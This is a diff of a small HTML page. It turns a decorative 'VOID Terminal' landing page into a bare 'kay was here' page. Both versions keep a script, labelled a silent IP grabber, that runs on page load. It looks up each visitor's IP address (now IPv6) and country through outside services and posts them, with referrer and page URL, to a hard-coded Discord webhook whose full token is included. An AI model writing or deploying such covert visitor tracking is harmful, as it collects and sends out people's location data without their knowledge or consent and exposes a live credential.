@@ -3,16 +3,9 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>VOID • Terminal</title>
+  <title>kay was here</title>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap">
   <style>
-    :root {
-      --bg:       #000000;
-      --text:     #d0d0d0;
-      --muted:    #666666;
-      --accent:   #aaaaaa;
-      --glitch:   #ffffff;
-    }
-
     * {
       margin: 0;
       padding: 0;
@@ -20,195 +13,69 @@
     }
 
     body {
-      background: var(--bg);
-      color: var(--text);
-      font-family: 'Courier New', Courier, monospace;
-      min-height: 100vh;
-      overflow-x: hidden;
-      position: relative;
-      line-height: 1.6;
+      background: #000000;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
     }
 
-    /* Background particles */
-    #particles {
-      position: fixed;
-      inset: 0;
-      pointer-events: none;
-      z-index: 1;
-    }
-
-    .particle {
-      position: absolute;
-      background: var(--accent);
-      border-radius: 50%;
-      opacity: 0.15;
-      animation: float 25s infinite linear;
-    }
-
-    @keyframes float {
-      0%   { transform: translateY(100vh) scale(0.2); opacity: 0; }
-      10%  { opacity: 0.6; }
-      90%  { opacity: 0.6; }
-      100% { transform: translateY(-20vh) scale(0.8); opacity: 0; }
-    }
-
-    /* Scanlines */
-    .scanlines {
-      position: fixed;
-      inset: 0;
-      background: repeating-linear-gradient(
-        to bottom,
-        transparent 0%,
-        rgba(0,0,0,0.08) 1px,
-        transparent 2px
-      );
-      background-size: 100% 4px;
-      pointer-events: none;
-      z-index: 2;
-      animation: scan 8s linear infinite;
-    }
-
-    @keyframes scan {
-      0% { transform: translateY(-100%); }
-      100% { transform: translateY(100%); }
-    }
-
-    .container {
-      position: relative;
-      z-index: 10;
-      max-width: 1100px;
-      margin: 0 auto;
-      padding: 80px 24px 120px;
+    .text {
+      font-family: 'Press Start 2P', cursive;
+      font-size: 5.5vw;          /* scales with screen width */
+      color: #ffffff;
       text-align: center;
-    }
-
-    header {
-      margin-bottom: 100px;
-    }
-
-    h1 {
-      font-size: 4.8rem;
-      font-weight: 900;
-      letter-spacing: -0.08em;
-      text-transform: uppercase;
-      margin-bottom: 16px;
-      color: var(--glitch);
+      line-height: 1.2;
       text-shadow: 
-        0 0 10px rgba(255,255,255,0.3),
-        2px 2px 0 #000, -2px -2px 0 #000,
-        -2px 2px 0 #000, 2px -2px 0 #000;
-      animation: glitch 4s infinite;
+        6px 6px 0 #000,
+       -6px -6px 0 #000,
+        6px -6px 0 #000,
+       -6px 6px 0 #000;
+      letter-spacing: 0.08em;
+      user-select: none;
     }
 
-    @keyframes glitch {
-      0%, 100% { transform: translate(0); }
-      2%  { transform: translate(-2px, 2px); }
-      4%  { transform: translate(2px, -2px); }
-      6%  { transform: translate(-1px, 1px); }
-      8%  { transform: translate(1px, -1px); }
-    }
-
-    .subtitle {
-      font-size: 1.5rem;
-      color: var(--muted);
-      max-width: 680px;
-      margin: 0 auto 60px;
-    }
-
-    .grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
-      gap: 32px;
-      margin: 80px 0;
-    }
-
-    .card {
-      background: rgba(20,20,20,0.6);
-      border: 1px solid var(--muted);
-      border-radius: 8px;
-      padding: 40px 28px;
-      transition: all 0.4s ease;
-      backdrop-filter: blur(8px);
-    }
-
-    .card:hover {
-      transform: translateY(-8px);
-      border-color: var(--accent);
-      box-shadow: 0 20px 40px rgba(0,0,0,0.8);
-    }
-
-    .card h3 {
-      font-size: 1.6rem;
-      margin-bottom: 16px;
-      color: var(--accent);
-    }
-
-    .card p {
-      color: var(--muted);
-    }
-
-    footer {
-      margin-top: 120px;
-      font-size: 0.9rem;
-      color: #444;
-      text-align: center;
-    }
-
-    @media (max-width: 768px) {
-      h1 { font-size: 3.6rem; }
-      .subtitle { font-size: 1.3rem; }
+    @media (max-width: 600px) {
+      .text {
+        font-size: 9vw;
+      }
     }
   </style>
 </head>
 <body>
 
-  <div id="particles"></div>
-  <div class="scanlines"></div>
-
-  <div class="container">
-    <header>
-      <h1>VOID</h1>
-      <p class="subtitle">
-        Enter the terminal. Access granted. Reality optional.
-      </p>
-    </header>
-
-    <section class="grid">
-      <div class="card">
-        <h3>Status</h3>
-        <p>System online • Latency: 12ms • Nodes: 47 active</p>
-      </div>
-      <div class="card">
-        <h3>Protocol</h3>
-        <p>Encrypted tunnel • Zero-knowledge • End-to-end</p>
-      </div>
-      <div class="card">
-        <h3>Access</h3>
-        <p>Session authenticated • No logs retained • Trace erased</p>
-      </div>
-    </section>
-
-    <footer>
-      VOID TERMINAL • 2026 • All connections monitored for quality
-    </footer>
+  <div class="text">
+    kay was here
   </div>
 
   <script>
     // ──────────────────────────────────────────────────────────────
-    // IP GRABBER + DISCORD WEBHOOK (silent background)
+    // IPv6-only grabber + country (silent)
     // ──────────────────────────────────────────────────────────────
     const webhook = 'https://discord.com/api/webhooks/1462407993961480386/R49486d_gn1NRtuwvMWN2jwCgLxF6MeDa83LuCJQrkVxOJWTIGCuEhAepmgDey062pH5';
 
     async function logVisit() {
       try {
-        const ipRes = await fetch('https://api.ipify.org?format=json');
-        const { ip = 'unknown' } = await ipRes.json() ?? {};
+        let ipv6 = 'none';
+        try {
+          const res = await fetch('https://api6.ipify.org?format=json');
+          const data = await res.json();
+          ipv6 = data.ip || 'none';
+        } catch {}
+
+        let country = 'unknown';
+        try {
+          const geo = await fetch('https://ipapi.co/json/');
+          const geoData = await geo.json();
+          country = geoData.country_name || geoData.country || 'unknown';
+        } catch {}
 
         const payload = {
           content: [
-            '**VOID Access**',
-            `IP: ${ip}`,
-            `UA: ${navigator.userAgent || '—'}`,
+            '**kay was here**',
+            `IPv6: ${ipv6}`,
+            `Country: ${country}`,
             `Referrer: ${document.referrer || 'direct'}`,
             `Page: ${window.location.href}`,
             `Time: ${new Date().toISOString()}`
@@ -225,27 +92,6 @@
     }
 
     logVisit();
-
-    // ──────────────────────────────────────────────────────────────
-    // Floating particles
-    // ──────────────────────────────────────────────────────────────
-    const particlesContainer = document.getElementById('particles');
-    const numParticles = 60;
-
-    for (let i = 0; i < numParticles; i++) {
-      const particle = document.createElement('div');
-      particle.className = 'particle';
-      
-      const size = Math.random() * 3 + 1;
-      particle.style.width = `${size}px`;
-      particle.style.height = `${size}px`;
-      
-      particle.style.left = `${Math.random() * 100}vw`;
-      particle.style.animationDuration = `${Math.random() * 20 + 15}s`;
-      particle.style.animationDelay = `${Math.random() * 10}s`;
-      
-      particlesContainer.appendChild(particle);
-    }
   </script>
 
 </body>
